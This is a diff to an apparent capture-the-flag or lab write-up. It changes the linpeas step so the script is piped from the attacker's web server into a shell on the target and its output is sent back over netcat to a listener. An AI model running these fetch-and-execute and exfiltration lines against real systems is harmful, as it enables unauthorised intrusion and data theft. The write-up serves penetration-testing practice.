@@ -286,38 +286,12 @@ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 sudo python3 -m http.server 8888
 ```
 
-Then, we copy linpeas on the box and run it:
+Before running it, we need to setup a listener for the incoming data:
 ```
-$ cd /tmp
-$ wget 10.10.14.9:8888/linpeas.sh
---2025-08-15 18:54:06--  http://10.10.14.9:8888/linpeas.sh
-Connecting to 10.10.14.9:8888... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 956174 (934K) [text/x-sh]
-Saving to: ‘linpeas.sh’
+nc -lvnp 9999 | tee linpeas.out
+```
 
-     0K .......... .......... .......... .......... ..........  5% 1.21M 1s
-    50K .......... .......... .......... .......... .......... 10% 2.46M 1s
-   100K .......... .......... .......... .......... .......... 16% 26.0M 0s
-   150K .......... .......... .......... .......... .......... 21% 2.75M 0s
-   200K .......... .......... .......... .......... .......... 26% 28.1M 0s
-   250K .......... .......... .......... .......... .......... 32% 24.9M 0s
-   300K .......... .......... .......... .......... .......... 37% 14.3M 0s
-   350K .......... .......... .......... .......... .......... 42% 35.0M 0s
-   400K .......... .......... .......... .......... .......... 48% 3.43M 0s
-   450K .......... .......... .......... .......... .......... 53% 21.8M 0s
-   500K .......... .......... .......... .......... .......... 58% 43.9M 0s
-   550K .......... .......... .......... .......... .......... 64% 22.0M 0s
-   600K .......... .......... .......... .......... .......... 69% 37.7M 0s
-   650K .......... .......... .......... .......... .......... 74% 44.3M 0s
-   700K .......... .......... .......... .......... .......... 80% 10.2M 0s
-   750K .......... .......... .......... .......... .......... 85% 47.9M 0s
-   800K .......... .......... .......... .......... .......... 91% 8.00M 0s
-   850K .......... .......... .......... .......... .......... 96% 36.3M 0s
-   900K .......... .......... .......... ...                  100% 25.4M=0.1s
-
-2025-08-15 18:54:06 (7.29 MB/s) - ‘linpeas.sh’ saved [956174/956174]
-
-$ chmod +x linpeas.sh
-$ ./linpeas.sh -q -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex -e > linpeas_output.txt
+Once that's done, we download linpeas on the box from the attacker web server and run it from memory, sending the output to the attacker machine:
+```
+curl 10.10.14.9:8888/linpeas.sh | sh | nc 10.10.14.9 9999
 ```
